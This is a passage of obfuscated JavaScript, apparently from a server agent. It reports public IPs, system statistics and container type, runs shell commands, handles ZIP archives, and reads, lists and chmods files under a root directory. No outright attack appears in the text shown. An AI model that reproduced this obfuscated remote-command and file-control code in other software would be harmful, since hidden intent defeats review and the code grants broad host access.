                j = h ? Buffer[cc(0x317)](m[cc(0x6e2)](Math['max'](0x0, f['zmrHv'](m[cc(0x8fc)], h)))) : Buffer[cc(0x5fd)](0x0);
            }
            return ![];
        } catch {
            return ![];
        } finally {
            if (f['nLCsp'](g, null))
                try {
                    a0l[cc(0x170)](g);
                } catch {
                }
        }
    }
    [a0aY(0x7cb)]() {
        const cd = a0aY, a = {
                'ILkvS': function (c, d) {
                    return c === d;
                }
            }, b = a0p[cd(0x40e)]();
        for (const c of Object['keys'](b)) {
            for (const d of b[c]) {
                const f = a[cd(0xfa)](d[cd(0x362)], cd(0x302)) || a[cd(0xfa)](d[cd(0x362)], 0x4);
                if (f && !d[cd(0x8e7)]) {
                    if (!/^10\./['test'](d[cd(0x2ea)]) && !/^192\.168\./[cd(0x292)](d[cd(0x2ea)]) && !/^172\.(1[6-9]|2[0-9]|3[0-1])\./[cd(0x292)](d[cd(0x2ea)]))
                        return d[cd(0x2ea)];
                }
            }
        }
        return null;
    }
    async ['getPublicIpV4']() {
        const ce = a0aY, a = {
                'DCUzT': ce(0x329),
                'gNhkT': ce(0x829),
                'UvRdD': ce(0x722),
                'anSJK': ce(0xfc)
            }, b = [
                a['DCUzT'],
                'https://icanhazip.com',
                ce(0x1aa),
                a[ce(0x7ce)],
                a[ce(0x4ed)],
                ce(0x1fc),
                a['anSJK']
            ];
        for (const d of b) {
            try {
                const f = await this[ce(0x747)](d, 0x4);
                if (f && this[ce(0x595)](f))
                    return f;
            } catch (g) {
                continue;
            }
        }
        const c = this['getLocalIPv4']();
        if (c && this[ce(0x595)](c))
            return c;
        return null;
    }
    [a0aY(0x5a0)]() {
        const cf = a0aY, a = {
                'HYrYd': cf(0x3d3),
                'KREPv': function (c, d) {
                    return c === d;
                },
                'PbeJK': cf(0x177)
            }, b = a0p[cf(0x40e)]();
        for (const c of Object['keys'](b)) {
            for (const d of b[c]) {
                const f = d[cf(0x362)] === a[cf(0x8c1)] || a['KREPv'](d['family'], 0x6);
                if (f && !d[cf(0x8e7)]) {
                    if (!d[cf(0x2ea)][cf(0x52c)]()[cf(0x49a)](a[cf(0x78c)]))
                        return d['address'];
                }
            }
        }
        return null;
    }
    async [a0aY(0x7e2)]() {
        const cg = a0aY, a = {
                'kgSNJ': cg(0x8d1),
                'MOhdI': 'https://icanhazip.com',
                'VAZgj': 'https://v6.ident.me'
            }, b = this[cg(0x5a0)]();
        if (b && this[cg(0x6cd)](b))
            return b;
        const c = [
            a[cg(0x413)],
            a['MOhdI'],
            a[cg(0x66e)]
        ];
        for (const d of c) {
            try {
                const f = await this['fetchIP'](d, 0x6);
                if (f && this['isValidIPv6'](f))
                    return f;
            } catch (g) {
                a0D[cg(0x52b)](cg(0x7b8) + d + '\x20失败:\x20' + g[cg(0x113)]);
                continue;
            }
        }
        return null;
    }
    async [a0aY(0x747)](a, b = 0x0) {
        const ch = a0aY, c = {
                'hTCYF': function (d, f) {
                    return d(f);
                },
                'zmEPD': ch(0x4d3),
                'yUesF': function (d, f) {
                    return d !== f;
                },
                'cXQxN': ch(0x7a4),
                'ZiMqR': function (d, f) {
                    return d(f);
                },
                'YfSpY': ch(0x382),
                'oBTNE': ch(0x1e9)
            };
        return new Promise((d, f) => {
            const ck = ch, g = {
                    'SkvZi': function (k, l) {
                        const ci = a0b;
                        return c[ci(0x32c)](k, l);
                    },
                    'prBXK': function (k, l) {
                        const cj = a0b;
                        return c[cj(0x5d0)](k, l);
                    },
                    'RUKcF': c[ck(0x4d6)],
                    'BQAZc': ck(0x233)
                }, h = c[ck(0x5d4)](require, c[ck(0x180)]), i = {
                    'timeout': 0x1388,
                    'family': b,
                    'headers': { 'Accept': ck(0x87d) }
                }, j = h[ck(0x14d)](a, i, k => {
                    const cl = ck;
                    let l = '';
                    if (g[cl(0x49f)](k['statusCode'], 0xc8)) {
                        g[cl(0x4e6)](f, new Error(cl(0x601) + k[cl(0x14e)]));
                        return;
                    }
                    k['on'](g['RUKcF'], m => l += m), k['on'](g[cl(0x385)], () => d(l[cl(0x2eb)]()));
                });
            j['on'](c['oBTNE'], f), j[ck(0x7e0)](0x1388, () => {
                const cm = ck;
                j[cm(0x6cf)](), c[cm(0x5d0)](f, new Error(c[cm(0x2e4)]));
            });
        });
    }
    [a0aY(0x595)](a) {
        const cn = a0aY;
        return /^(\d{1,3}\.){3}\d{1,3}$/[cn(0x292)](a);
    }
    [a0aY(0x6cd)](a) {
        const co = a0aY;
        if (!/^[0-9a-fA-F:]+$/[co(0x292)](a) || !a[co(0x27e)](':'))
            return ![];
        const b = a[co(0x3ab)](':')[0x0];
        return /^[23][0-9a-fA-F]{3}$/[co(0x292)](b);
    }
    async [a0aY(0x6a7)]() {
        const cp = a0aY, a = {
                'GXCuU': function (m, n) {
                    return m / n;
                },
                'UsevQ': function (m, n) {
                    return m - n;
                },
                'TpSMz': function (m, n) {
                    return m / n;
                },
                'cPGmT': function (m, n) {
                    return m * n;
                },
                'HjgkN': function (m, n) {
                    return m / n;
                },
                'McYWg': function (m, n) {
                    return m / n;
                }
            }, [b, c, d, f] = await Promise[cp(0x8ce)]([
                a0u[cp(0x6f4)](),
                a0u[cp(0x64a)](),
                a0u[cp(0x6ad)](),
                a0u[cp(0x6f4)]()
            ]), g = d[0x0] || {
                'tx_bytes': 0x0,
                'rx_bytes': 0x0
            }, h = a[cp(0x50b)](Date['now'](), 0x3e8), i = a[cp(0x1ae)](h, this[cp(0x339)]), j = g[cp(0x6b9)] - this[cp(0x4c3)]['tx'], k = g['rx_bytes'] - this[cp(0x4c3)]['rx'];
        this[cp(0x556)] += j, this[cp(0x3ee)] += k, this[cp(0x4c3)] = {
            'tx': g[cp(0x6b9)],
            'rx': g[cp(0x312)]
        }, this[cp(0x339)] = h;
        const l = await a0u['processes']();
        return {
            'cpu': { 'usage': Math['round'](b[cp(0x6f4)]) },
            'ram': {
                'total': c[cp(0x73f)],
                'used': c[cp(0x6e0)]
            },
            'swap': {
                'total': c[cp(0x8db)],
                'used': c[cp(0x26e)]
            },
            'load': {
                'load1': a[cp(0x606)](Math[cp(0x38f)](a[cp(0x701)](f[cp(0x4c5)], 0x64)), 0x64),
                'load5': a[cp(0x6ee)](Math[cp(0x38f)](f[cp(0x4c5)] * 0x64), 0x64),
                'load15': a[cp(0x18f)](Math[cp(0x38f)](a[cp(0x701)](f[cp(0x4c5)], 0x64)), 0x64)
            },
            'disk': await this[cp(0x25d)](),
            'network': {
                'up': Math['round'](a['TpSMz'](j, i)),
                'down': Math[cp(0x38f)](a[cp(0x6ee)](k, i)),
                'totalUp': this[cp(0x556)],
                'totalDown': this['totalNetworkDown']
            },
            'connections': await this[cp(0x819)](),
            'uptime': a0p[cp(0x857)](),
            'process': l?.['all'] || 0x0,
            'message': ''
        };
    }
    async [a0aY(0x1b1)]() {
        const cq = a0aY, a = {
                'BnJmc': cq(0x38e),
                'Dkfus': 'Docker',
                'aSgkR': cq(0x5fb),
                'KzEPu': cq(0x51b),
                'xNfqS': cq(0x338),
                'etTGb': cq(0x330),
                'AFbsZ': cq(0x7d7),
                'tBrkW': cq(0x702),
                'CLXTP': 'kubepods',
                'bYrQh': cq(0x127),
                'HBqqj': cq(0x374),
                'KVnbd': '/proc/self/mountinfo',
                'GbWSI': cq(0x849),
                'gOVfR': cq(0x58f),
                'BXUMH': 'kubelet',
                'JbJWL': cq(0x417),
                'HOcJD': cq(0x921),
                'CtMRh': cq(0x38c),
                'JIBWv': '/proc/cpuinfo',
                'kRXqO': cq(0xe7),
                'DcXmw': cq(0x475)
            };
        try {
            if (a0l['existsSync'](a[cq(0x845)]))
                return a['Dkfus'];
            if (a0l[cq(0xfe)](a['aSgkR']))
                return a[cq(0x484)];
            if (a0l[cq(0xfe)](a[cq(0x318)])) {
                const b = a0l[cq(0x734)](a[cq(0x318)], a[cq(0x80c)])[cq(0x52c)]();
                if (b['includes'](a[cq(0x1a0)]) || b[cq(0x27e)](a[cq(0x643)]))
                    return a['Dkfus'];
                else {
                    if (b[cq(0x27e)](a[cq(0x343)]))
                        return a[cq(0x234)];
                    else {
                        if (b[cq(0x27e)](a[cq(0x840)]))
                            return 'LXC';
                    }
                }
            }
            if (a0l[cq(0xfe)](a['KVnbd'])) {
                const c = a0l[cq(0x734)](a['KVnbd'], a[cq(0x80c)]);
                if (c[cq(0x27e)](a[cq(0x1ec)]) || c[cq(0x27e)](a[cq(0x145)]))
                    return a[cq(0x586)];
                else {
                    if (c[cq(0x27e)]('/pods/') || c['includes'](a[cq(0x92a)]))
                        return a[cq(0x234)];
                }
            }
            if (a0l[cq(0xfe)](a[cq(0x189)])) {
                const d = a0l[cq(0x734)](a[cq(0x189)], a[cq(0x80c)]);
                if (d[cq(0x27e)](a[cq(0x84a)]))
                    return a['CtMRh'];
            }
            if (a0l['existsSync'](a[cq(0x130)])) {
                const f = a0l['readFileSync'](a[cq(0x130)], a[cq(0x80c)]);
                if (f[cq(0x27e)](cq(0x80a)) || f[cq(0x27e)](a[cq(0x7a8)]))
                    return cq(0x80a);
            }
        } catch (g) {
        }
        return a[cq(0x518)];
    }
    async [a0aY(0x25d)]() {
        const cr = a0aY, a = {
                'qOEDa': function (b, c) {
                    return b > c;
                },
                'DKzom': function (b, c) {
                    return b !== c;
                },
                'frBVy': 'overlay',
                'RevFW': cr(0x3ae)
            };
        try {
            const b = await a0u['fsSize'](), c = b[cr(0x3fe)](g => {
                    const cs = cr;
                    return a[cs(0x767)](g[cs(0x3e9)], 0x0) && a['DKzom'](g[cs(0x5d2)], cs(0x620)) && g[cs(0x5d2)] !== a[cs(0x7d9)] && g['fs'][cs(0x49a)](a['RevFW']);
                }), d = c[cr(0x2a3)]((g, h) => g + h[cr(0x3e9)], 0x0), f = c[cr(0x2a3)]((g, h) => g + h[cr(0x875)], 0x0);
            return {
                'total': d,
                'used': f
            };
        } catch {
            return {
                'total': 0x0,
                'used': 0x0
            };
        }
    }
    async [a0aY(0x819)]() {
        const ct = a0aY;
        try {
            const a = await a0u['networkConnections'](), b = a[ct(0x3fe)](d => d[ct(0x5cb)] === 'tcp')[ct(0x8fc)], c = a[ct(0x3fe)](d => d[ct(0x5cb)] === ct(0x83a))[ct(0x8fc)];
            return {
                'tcp': b,
                'udp': c
            };
        } catch {
            return {
                'tcp': 0x0,
                'udp': 0x0
            };
        }
    }
}
class a0V {
    static async [a0aY(0xec)](a, b = {}) {
        const cu = a0aY, c = {
                'fLveS': function (d, f) {
                    return d - f;
                },
                'SqNMb': cu(0x3e2),
                'IqdZU': function (d, f) {
                    return d(f);
                },
                'rmiZE': function (d, f, g, h) {
                    return d(f, g, h);
                },
                'nihcn': function (d, f) {
                    return d * f;
                },
                'klhFn': function (d, f) {
                    return d * f;
                }
            }, {
                cwd: cwd = process['cwd'](),
                env: env = {},
                timeout: timeout = a0P[cu(0x124)]
            } = b;
        return new Promise(d => {
            const cv = cu, f = Date[cv(0x4ea)](), g = c[cv(0x380)](a0r, a, {
                    'cwd': cwd,
                    'env': {
                        ...process.env,
                        ...env
                    },
                    'timeout': c['nihcn'](timeout, 0x3e8),
                    'maxBuffer': c[cv(0x8cd)](c[cv(0x8cd)](0xa, 0x400), 0x400)
                }, (h, i, j) => {
                    const cw = cv, k = c[cw(0x870)](Date['now'](), f), l = h && h['killed'] && h[cw(0x306)];
                    let m = i || '';
                    if (j)
                        m += j;
                    let n = 0x0;
                    if (h) {
                        if (l)
                            n = 0x7c;
                        else
                            typeof h['code'] === c[cw(0x309)] ? n = h[cw(0x221)] : n = -0x1;
                    }
                    c[cw(0x614)](d, {
                        'result': m,
                        'exitcode': n,
                        'timeout': l,
                        'cmd': a
                    });
                });
        });
    }
}
function a0W(a) {
    const cx = a0aY, b = {
            'woQQH': function (c, d) {
                return c === d;
            }
        };
    try {
        const c = a0l[cx(0x649)][cx(0x813)](a0o[cx(0x791)](a0P['FILE_ROOT'])), d = a0o['resolve'](a);
        let f = d;
        while (!a0l[cx(0xfe)](f)) {
            const j = a0o[cx(0x2fc)](f);
            if (b[cx(0x592)](j, f))
                return ![];
            f = j;
        }
        const g = a0l[cx(0x649)][cx(0x813)](f), h = a0o['relative'](c, g);
        if (h[cx(0x49a)]('..') || a0o[cx(0x208)](h))
            return ![];
        const i = a0o['relative'](f, d);
        if (i && (i[cx(0x49a)]('..') || a0o[cx(0x208)](i)))
            return ![];
        return !![];
    } catch (k) {
        return ![];
    }
}
class a0X {
    static [a0aY(0x167)] = 0x4e20;
    static [a0aY(0xd3)] = 0x200 * 0x400 * 0x400;
    static [a0aY(0x76f)] = 0x1f4;
    static [a0aY(0x4ef)] = null;
    static [a0aY(0x8c5)](a) {
        const cy = a0aY, b = {
                'LlYmZ': function (g, h) {
                    return g < h;
                },
                'zdaDr': function (g, h) {
                    return g & h;
                },
                'yKQSs': function (g, h) {
                    return g ^ h;
                },
                'Iusoz': function (g, h) {
                    return g >>> h;
                },
                'HscbF': function (g, h) {
                    return g ^ h;
                },
                'Eiaon': function (g, h) {
                    return g >>> h;
                },
                'eeFzy': function (g, h) {
                    return g & h;
                },
                'BdMHg': function (g, h) {
                    return g ^ h;
                },
                'SKshp': function (g, h) {
                    return g >>> h;
                },
                'EmTZA': function (g, h) {
                    return g ^ h;
                }
            };
        if (!a0X[cy(0x4ef)]) {
            const g = new Int32Array(0x100);
            for (let h = 0x0; b[cy(0x182)](h, 0x100); h++) {
                let j = h;
                for (let l = 0x0; l < 0x8; l++)
                    j = b['zdaDr'](j, 0x1) ? b['yKQSs'](0xedb88320, b[cy(0x825)](j, 0x1)) : b[cy(0x825)](j, 0x1);
                g[h] = j;
            }
            a0X[cy(0x4ef)] = g;
        }
        const d = a0X[cy(0x4ef)];
        let f = -0x1;
        for (let m = 0x0; m < a['length']; m++)
            f = b['HscbF'](b['Eiaon'](f, 0x8), d[b[cy(0x377)](b['BdMHg'](f, a[m]), 0xff)]);
        return b['SKshp'](b[cy(0x89f)](f, -0x1), 0x0);
    }
    static ['_dosDateTime'](a) {
        const cz = a0aY, b = {
                'jIsaD': function (g, h) {
                    return g & h;
                },
                'uAiYp': function (g, h) {
                    return g | h;
                },
                'FFoML': function (g, h) {
                    return g << h;
                },
                'mNTxj': function (g, h) {
                    return g >> h;
                },
                'Dvhbs': function (g, h) {
                    return g | h;
                },
                'QqedD': function (g, h) {
                    return g - h;
                },
                'jCwBb': function (g, h) {
                    return g + h;
                }
            }, c = b[cz(0x4b9)](b['uAiYp'](b[cz(0x919)](b[cz(0x1ef)](a[cz(0x726)](), 0xb), a[cz(0x58a)]() << 0x5), b['mNTxj'](a[cz(0x1e1)](), 0x1)), 0xffff), f = b[cz(0x919)](b[cz(0x87c)](b[cz(0x1ef)](b[cz(0x6f7)](a[cz(0x6c3)](), 0x7bc), 0x9), b['FFoML'](b[cz(0x6a0)](a['getMonth'](), 0x1), 0x5)), a['getDate']()) & 0xffff;
        return {
            'time': c,
            'date': f
        };
    }
    static [a0aY(0x274)](a) {
        const cA = a0aY, b = {
                'fAvCM': function (i, j) {
                    return i < j;
                },
                'YtyiB': function (i, j) {
                    return i - j;
                },
                'oDfnU': cA(0x330),
                'QflPR': function (i, j) {
                    return i < j;
                },
                'KBdfz': function (i, j) {
                    return i(j);
                },
                'EiTEr': function (i, j) {
                    return i + j;
                },
                'niFHZ': function (i, j) {
                    return i(j);
                }
            }, c = a0l['openSync'](a, 'w'), d = [];
        let f = 0x0, g = 0x0;
        const h = i => {
            const cB = cA;
            let j = 0x0;
            while (b['fAvCM'](j, i[cB(0x8fc)]))
                j += a0l[cB(0x4ee)](c, i, j, b[cB(0x769)](i[cB(0x8fc)], j));
        };
        return {
            'add'(i, j, k, l = ![]) {
                const cC = cA;
                if (g >= a0X[cC(0x167)])
                    return ![];
                const m = Buffer[cC(0x317)](i, b[cC(0x15d)]);
                j = j || Buffer[cC(0x5fd)](0x0);
                const n = l ? 0x0 : a0X[cC(0x8c5)](j);
                let o = 0x0, p = j;
                if (!l && j[cC(0x8fc)] > 0x0) {
                    const u = a0n[cC(0x30d)](j, { 'level': 0x6 });
                    b[cC(0x300)](u[cC(0x8fc)], j[cC(0x8fc)]) && (o = 0x8, p = u);
                }
                const {
                        time: q,
                        date: r
                    } = a0X[cC(0x28e)](k || new Date()), s = Buffer[cC(0x5fd)](0x1e);
                s[cC(0x641)](0x4034b50, 0x0), s[cC(0x568)](0x14, 0x4), s[cC(0x568)](0x800, 0x6), s[cC(0x568)](o, 0x8), s[cC(0x568)](q, 0xa), s[cC(0x568)](r, 0xc), s[cC(0x641)](n, 0xe), s['writeUInt32LE'](p['length'], 0x12), s[cC(0x641)](j[cC(0x8fc)], 0x16), s[cC(0x568)](m[cC(0x8fc)], 0x1a), s[cC(0x568)](0x0, 0x1c), b[cC(0x2b1)](h, s), h(m), h(p);
                const t = Buffer[cC(0x5fd)](0x2e);
                return t[cC(0x641)](0x2014b50, 0x0), t['writeUInt16LE'](0x14, 0x4), t['writeUInt16LE'](0x14, 0x6), t[cC(0x568)](0x800, 0x8), t[cC(0x568)](o, 0xa), t['writeUInt16LE'](q, 0xc), t['writeUInt16LE'](r, 0xe), t[cC(0x641)](n, 0x10), t[cC(0x641)](p[cC(0x8fc)], 0x14), t[cC(0x641)](j['length'], 0x18), t[cC(0x568)](m[cC(0x8fc)], 0x1c), t['writeUInt16LE'](0x0, 0x1e), t[cC(0x568)](0x0, 0x20), t[cC(0x568)](0x0, 0x22), t[cC(0x568)](0x0, 0x24), t[cC(0x641)](l ? 0x10 : 0x0, 0x26), t['writeUInt32LE'](f, 0x2a), d[cC(0x1f0)](t, m), f += b['EiTEr'](b[cC(0x7b4)](0x1e, m['length']), p['length']), g++, !![];
            },
            'close'() {
                const cD = cA, i = Buffer[cD(0x65f)](d), j = Buffer[cD(0x5fd)](0x16);
                return j['writeUInt32LE'](0x6054b50, 0x0), j[cD(0x568)](0x0, 0x4), j['writeUInt16LE'](0x0, 0x6), j[cD(0x568)](g, 0x8), j[cD(0x568)](g, 0xa), j[cD(0x641)](i[cD(0x8fc)], 0xc), j[cD(0x641)](f, 0x10), j[cD(0x568)](0x0, 0x14), h(i), b[cD(0x257)](h, j), a0l[cD(0x170)](c), g;
            }
        };
    }
    static ['parse'](a) {
        const cE = a0aY, b = {
                'kQkxk': function (n, o) {
                    return n - o;
                },
                'IwgEL': function (n, o) {
                    return n + o;
                },
                'woTss': function (n, o) {
                    return n - o;
                },
                'AMxCF': function (n, o) {
                    return n >= o;
                },
                'NYYLZ': function (n, o) {
                    return n === o;
                },
                'eqrOC': function (n, o) {
                    return n < o;
                },
                'RzjhO': cE(0x8b6),
                'eDKec': function (n, o) {
                    return n + o;
                },
                'hKxdm': function (n, o) {
                    return n < o;
                },
                'aiBWo': function (n, o) {
                    return n <= o;
                },
                'Ilbqz': function (n, o) {
                    return n !== o;
                },
                'KTBZS': function (n, o) {
                    return n + o;
                },
                'IpIYt': function (n, o) {
                    return n + o;
                },
                'QlGBp': function (n, o) {
                    return n + o;
                },
                'lSJJy': function (n, o) {
                    return n + o;
                },
                'VSuQI': function (n, o) {
                    return n + o;
                },
                'GTIVu': function (n, o) {
                    return n !== o;
                },
                'BrEGM': function (n, o) {
                    return n & o;
                },
                'cJRGh': function (n, o) {
                    return n !== o;
                },
                'neUuj': function (n, o) {
                    return n === o;
                },
                'LQBmG': function (n, o) {
                    return n === o;
                },
                'yKopT': function (n, o) {
                    return n <= o;
                },
                'uWqHl': function (n, o) {
                    return n === o;
                },
                'Uqlwh': function (n, o) {
                    return n + o;
                },
                'BAWys': function (n, o) {
                    return n + o;
                }
            }, c = a0l[cE(0x734)](a);
        let d = -0x1;
        const f = Math[cE(0x2c1)](0x0, b[cE(0x1f3)](c[cE(0x8fc)], b[cE(0x6cc)](0xffff, 0x16)));
        for (let n = b[cE(0x2d7)](c[cE(0x8fc)], 0x16); b[cE(0x203)](n, f); n--) {
            if (b[cE(0x54a)](c['readUInt32LE'](n), 0x6054b50)) {
                d = n;
                break;
            }
        }
        if (b[cE(0x8c0)](d, 0x0))
            throw new Error(b[cE(0x3b3)]);
        const g = c[cE(0x21b)](b[cE(0x754)](d, 0xa)), h = c[cE(0x34f)](d + 0xc), j = c[cE(0x34f)](b[cE(0x754)](d, 0x10)), k = [];
        let l = j;
        const m = b[cE(0x6cc)](j, h);
        for (let o = 0x0; b[cE(0x90a)](o, g) && b['aiBWo'](b[cE(0x754)](l, 0x2e), m); o++) {
            if (b[cE(0x647)](c[cE(0x34f)](l), 0x2014b50))
                break;
            const q = c[cE(0x21b)](b[cE(0x6cc)](l, 0x8)), r = c[cE(0x21b)](b[cE(0x754)](l, 0xa)), s = c[cE(0x34f)](b[cE(0x6cc)](l, 0x10)), t = c[cE(0x34f)](b[cE(0x82d)](l, 0x14)), u = c[cE(0x34f)](b['IpIYt'](l, 0x18)), v = c[cE(0x21b)](l + 0x1c), w = c[cE(0x21b)](l + 0x1e), x = c[cE(0x21b)](l + 0x20), y = c[cE(0x34f)](b[cE(0x3d9)](l, 0x26)), z = c[cE(0x34f)](b[cE(0x223)](l, 0x2a)), A = c[cE(0x806)](b[cE(0x41d)](l, 0x2e), b[cE(0x754)](l + 0x2e, v))['toString'](cE(0x330));
            l += b[cE(0x223)](b[cE(0x41d)](0x2e, v), w) + x;
            const B = {
                'name': A,
                'isDir': A[cE(0x416)]('/') || b[cE(0xcd)](b[cE(0x751)](y, 0x10), 0x0),
                'method': r,
                'crc': s,
                'size': u,
                'compressedSize': t,
                'encrypted': b[cE(0x699)](b[cE(0x751)](q, 0x1), 0x0),
                'zip64': b[cE(0x2b5)](t, 0xffffffff) || u === 0xffffffff || b[cE(0x7ac)](z, 0xffffffff),
                'data': null
            };
            if (!B[cE(0xf8)] && !B[cE(0x3a7)] && !B[cE(0x736)]) {
                if (b[cE(0x4cd)](b['QlGBp'](z, 0x1e), c['length']) && b[cE(0x2aa)](c[cE(0x34f)](z), 0x4034b50)) {
                    const C = c[cE(0x21b)](b[cE(0x223)](z, 0x1a)), D = c[cE(0x21b)](b[cE(0x223)](z, 0x1c)), E = b[cE(0x223)](b[cE(0x12e)](z + 0x1e, C), D);
                    b['aiBWo'](E + t, c['length']) && (B['data'] = c[cE(0x806)](E, b[cE(0x1df)](E, t)));
                }
            }
            k['push'](B);
        }
        return k;
    }
    static [a0aY(0x66a)](a) {
        const cF = a0aY, b = {
                'mJrAF': function (c, d) {
                    return c === d;
                }
            };
        if (b[cF(0x73e)](a[cF(0x43c)], 0x0))
            return a['data'];
        if (a['method'] === 0x8)
            return a0n[cF(0x864)](a[cF(0x7a4)]);
        throw new Error(cF(0x853) + a[cF(0x43c)]);
    }
}
class a0Y {
    static async [a0aY(0x231)](a, b = ![]) {
        const cG = a0aY, c = {
                'AYmLn': cG(0x82b),
                'UhHbn': cG(0x3aa),
                'nMlYT': function (h, i) {
                    return h & i;
                },
                'zXmly': function (h, i) {
                    return h(i);
                },
                'aYVxW': function (h, i) {
                    return h || i;
                },
                'owqaE': function (h, i) {
                    return h(i);
                }
            }, d = a0o['resolve'](a0P[cG(0x823)], c[cG(0x26b)](a, '.'));
        if (!c[cG(0x839)](a0W, d))
            throw new Error(cG(0x5ee));
        if (!a0l[cG(0xfe)](d))
            throw new Error('Path\x20not\x20found');
        const f = [], g = h => {
                const cH = cG, i = a0l[cH(0x603)](h);
                for (const j of i) {
                    const k = a0o[cH(0x2e0)](h, j), l = a0l[cH(0xca)](k), m = new a0L();
                    m[cH(0x258)] = j, m['path'] = a0o[cH(0x74e)](a0P['FILE_ROOT'], k), m[cH(0x5d2)] = l[cH(0x8e1)]() ? c['AYmLn'] : c[cH(0x213)], m['size'] = l[cH(0x3e9)], m[cH(0x359)] = l[cH(0x359)][cH(0x618)](), m[cH(0x291)] = this[cH(0x7fc)](l[cH(0x291)], l[cH(0x8e1)]()), m['mode_octal'] = '0o' + c[cH(0x743)](l[cH(0x291)], 0x1ff)[cH(0x62f)](0x8), m[cH(0x78a)] = l[cH(0x14a)] + ':' + l[cH(0x27a)], f[cH(0x1f0)](m), b && l['isDirectory']() && c['zXmly'](g, k);
                }
            };
        return g(d), f;
    }
    static async ['getFilePermissions'](a) {
        const cI = a0aY, b = {
                'mpBPb': function (d, f) {
                    return d(f);
                },
                'vuXaZ': function (d, f) {
                    return d & f;
                },
                'tMysO': cI(0x82b)
            }, c = [];
        for (const d of a) {
            const f = a0o['resolve'](a0P['FILE_ROOT'], d);
            if (!b[cI(0x298)](a0W, f))
                continue;
            try {
                const g = a0l[cI(0xca)](f), h = this['_checkAccess'](f, a0l[cI(0x392)][cI(0x46a)]), i = this[cI(0x286)](f, a0l[cI(0x392)][cI(0x756)]), j = this[cI(0x286)](f, a0l[cI(0x392)][cI(0x261)]), k = new a0M();
                k[cI(0x7d3)] = a0o[cI(0x74e)](a0P[cI(0x823)], f), k[cI(0x258)] = a0o[cI(0x884)](f), k[cI(0x291)] = this[cI(0x7fc)](g[cI(0x291)], g[cI(0x8e1)]()), k[cI(0x28c)] = '0o' + b[cI(0x2e6)](g['mode'], 0x1ff)['toString'](0x8), k[cI(0x5d2)] = g[cI(0x8e1)]() ? b[cI(0x13c)] : cI(0x3aa), k[cI(0x739)] = h, k[cI(0x907)] = i, k[cI(0x408)] = j, c[cI(0x1f0)](k);
            } catch (l) {
            }
        }
        return c;
    }
    static [a0aY(0x286)](a, b) {
        const cJ = a0aY;
        try {
            return a0l[cJ(0x8cb)](a, b), !![];
        } catch {
            return ![];
        }
    }
    static [a0aY(0x7b0)](a) {
        const cK = a0aY, b = {
                'CaHEK': function (c, d) {
                    return c === d;
                },
                'Dvrer': cK(0x3e2),
                'MaATr': function (c, d) {
                    return c === d;
                },
                'rGuBY': cK(0x33e),
                'VIzAQ': function (c, d, f) {
                    return c(d, f);
                },
                'oKqOW': cK(0x1f7)
            };
        if (b[cK(0x293)](typeof a, b['Dvrer']))
            return a;
        if (b['MaATr'](typeof a, b[cK(0x1b4)])) {
            const c = a[cK(0x2eb)]();
            if (/^[0-7]{3,4}$/[cK(0x292)](c))
                return b['VIzAQ'](parseInt, c, 0x8);
        }
        throw new Error(b['oKqOW']);
    }
    static [a0aY(0x7fc)](a, b) {
        const cL = a0aY, c = {
                'wSBkg': function (i, j, k) {
                    return i(j, k);
                }
            }, d = b ? 'd' : '-', f = [
                'r',
                'w',
                'x'
            ], g = (a & 0x1ff)[cL(0x62f)](0x8)[cL(0x1fd)](0x3, '0');
        let h = d;
        for (const i of g) {
            const j = c['wSBkg'](parseInt, i, 0xa);
            h += f[cL(0x162)]((k, l) => j & 0x4 >> l ? k : '-')[cL(0x2e0)]('');
        }
        return h;
    }
    static async ['setFilePermissions'](a, b = ![]) {
        const cM = a0aY, c = {
                'MqFDX': function (g, h) {
                    return g(h);
                },
                'eDyec': cM(0x1e9)
            }, d = [];
        for (const [g, h] of Object[cM(0x76e)](a)) {
            const i = a0o[cM(0x791)](a0P[cM(0x823)], g);
            if (!a0W(i)) {
                d[cM(0x1f0)]({
                    'path': g,
                    'requested': String(h),
                    'applied': '',
                    'mode_octal': '',
                    'status': cM(0x6b5)
                });
                continue;
            }
            try {
                const j = this['_parseMode'](h), k = m => {
                        const cN = cM;
                        a0l[cN(0x13e)](m, j);
                    };
                if (b && a0l[cM(0xfe)](i) && a0l[cM(0xca)](i)[cM(0x8e1)]()) {
                    const m = n => {
                        const cO = cM;
                        k(n);
                        const o = a0l[cO(0x603)](n);
                        for (const p of o) {
                            const q = a0o[cO(0x2e0)](n, p);
                            a0l[cO(0xca)](q)[cO(0x8e1)]() ? c['MqFDX'](m, q) : c[cO(0x296)](k, q);
                        }
                    };
                    m(i);
                } else
                    c[cM(0x296)](k, i);
                const l = j[cM(0x62f)](0x8);
                d[cM(0x1f0)]({
                    'path': g,
                    'requested': c[cM(0x296)](String, h),
                    'applied': l,
                    'mode_octal': '0o' + l,
                    'status': 'ok'
                });
            } catch (n) {
                d[cM(0x1f0)]({
                    'path': g,
                    'requested': String(h),
                    'applied': '',
                    'mode_octal': '',
                    'status': c[cM(0x709)],
                    'message': n[cM(0x113)]
                });
            }
        }
        const f = d['filter'](o => o[cM(0x5c3)] === 'ok')[cM(0x8fc)];
        return {
            'status': 'ok',
            'total': d[cM(0x8fc)],
            'success': f,
            'results': d
        };
    }
    static async ['readFile'](a) {
        const cP = a0aY, b = {
                'tvxjS': function (h, i) {
                    return h(i);
                },
                'Txrgk': 'Access\x20denied:\x20path\x20outside\x20root',
                'lfypY': function (h, i) {
                    return h > i;
                },
                'KVzZb': cP(0x7c9),
                'wcevQ': cP(0x330),
                'ePaAL': cP(0x1af)
            }, c = a0o[cP(0x791)](a0P[cP(0x823)], a);
        if (!b[cP(0x551)](a0W, c))
            throw new Error(b[cP(0x883)]);
        const d = a0l['statSync'](c);
        if (b[cP(0x88e)](d[cP(0x3e9)], 0x400 * 0x400))
            throw new Error(b['KVzZb']);
        const f = a0l[cP(0x734)](c), g = this[cP(0x504)](f);
        return {
            'status': 'ok',
            'path': a0o['relative'](a0P[cP(0x823)], c),
            'content': g ? a0w['fromByteArray'](f) : f[cP(0x62f)](b[cP(0x8b2)]),
            'encoding': g ? cP(0x262) : b[cP(0x652)],
            'is_binary': g,
            'size': d['size']
        };
    }
    static ['_isBinary'](a) {
        const cQ = a0aY, b = {
                'IIvYd': function (c, d) {
                    return c === d;
                },
                'dQNHG': function (c, d) {
                    return c === d;
                }
            };
        if (!a || b[cQ(0x25b)](a['length'], 0x0))
            return ![];
        for (let c = 0x0; c < Math[cQ(0x687)](a[cQ(0x8fc)], 0x200); c++) {
            if (b[cQ(0x7e7)](a[c], 0x0))
                return !![];
        }
        return ![];
    }
    static async [a0aY(0x584)](a, b, c, d = null, f = null) {
